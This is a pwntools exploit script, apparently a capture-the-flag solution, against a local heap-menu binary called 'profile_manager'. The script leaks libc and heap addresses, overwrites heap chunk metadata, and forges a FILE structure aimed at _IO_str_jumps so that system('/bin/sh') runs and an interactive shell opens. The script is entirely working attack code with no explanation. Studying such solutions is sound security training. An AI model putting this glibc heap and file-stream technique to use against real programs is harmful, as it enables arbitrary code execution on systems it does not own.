from pwn import *

r = process(["./profile_manager"],env={"LD_LIBRARY_PATH":"."})


def add(name,age,size,content):
	r.sendlineafter(":","1")
	r.sendafter(":",name)
	r.sendlineafter(":",str(age))
	r.sendlineafter(":",str(size))
	r.sendafter(":",content)

def show(idx):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(idx))

def edit(idx,name,age,content):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))
	r.sendafter(":",name)
	r.sendlineafter(":",str(age))
	r.sendafter(":",content)

def remove(idx):
	r.sendlineafter(":","4")
	r.sendlineafter(":",str(idx))

# leak libc
add("a",0x20,0xc0,"a")
add("b",0x20,0xa0,"a")
remove(0)
add("c",0x20,0xa0,"a")
add("d",0x20,0xa0,"a")
edit(2,"a"*8,0x20,"a")
show(2)
r.recvuntil("Name : "+"a"*8)
libc = u64(r.recvn(6)+"\x00\x00")-0x3c1b58  #0x3c4b78
print hex(libc)

r.recvuntil("a")
# leak heap
remove(0)
remove(1)

add("\x00",0x20,0xc0,"a")
edit(0,"a",0x20,"a")
show(0)
r.recvuntil("Name : ")
heap = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x61
print hex(heap)
r.recvuntil("a")
remove(0)
remove(2)

# attack

for i in range(6):
	add("a"*(8+(5-i)),0x20,0xa0,p64(0))
	remove(0)

add("a"*0x8+"\x21",0x20,0xa0,p64(0))
add("a",0x20,0xa0*2-0x10,"a")
add("a",0x20,0xe0,"a")
add("a"*8+"\xc1",0x20,0xa0,"a")

remove(1)
edit(2,"\x00",0x20,"a")
edit(2,p64(heap+0x10),0x20,"a")

add("a",0x20,0x90,"a")
add("a"*8+p16(0x331),0x20,0x90,"a")

remove(0)
remove(2)



system = libc + 0x456a0 #0x45390
io_str_jumps = libc + 0x3be4c0 #0x3c37a0
io_list_all = libc+0x3c2500 #0x3c5520
binsh = libc+0x18ac40 #0x18cd57
context.arch = "amd64"
#r.interactive()
FILE = flat(0,0x61,0x0,io_list_all-0x10,0x0,0x1,0x0,binsh
)

add("a",0x20,0x320,"a"*0x220+FILE.ljust(0xd8,'\x00')+p64(io_str_jumps-0x8)+p64(system)*2)

r.sendlineafter(":","1")
r.sendafter(":","a")
r.sendlineafter(":",str(0x100))
#input(":")
r.sendlineafter(":",str(0x100))


r.interactive()
